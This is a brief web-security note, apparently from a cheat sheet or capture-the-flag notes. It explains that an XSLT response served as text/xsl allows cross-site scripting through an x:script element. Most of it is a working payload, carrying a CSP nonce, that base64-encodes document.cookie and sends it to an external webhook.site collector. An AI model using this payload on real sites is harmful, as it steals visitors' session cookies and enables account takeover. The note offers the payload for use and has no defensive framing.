> Extensible Stylesheet Language Transformations (XSLT) is an XML-based language used, in conjunction with specialized processing software, for the transformation of XML documents.

if the ``Content-Type`` is ``text/xsl``, we can use ``<x:script>`` to perform XSS

EX:

```
<x:script xmlns:x="http://www.w3.org/1999/xhtml" nonce="Y8Ret8N5CPXrSG">fetch(`https://webhook.site/7f6a5e15-9149-4765-9716-a200384a2154/?c=${btoa(document.cookie)}`)</x:script>
```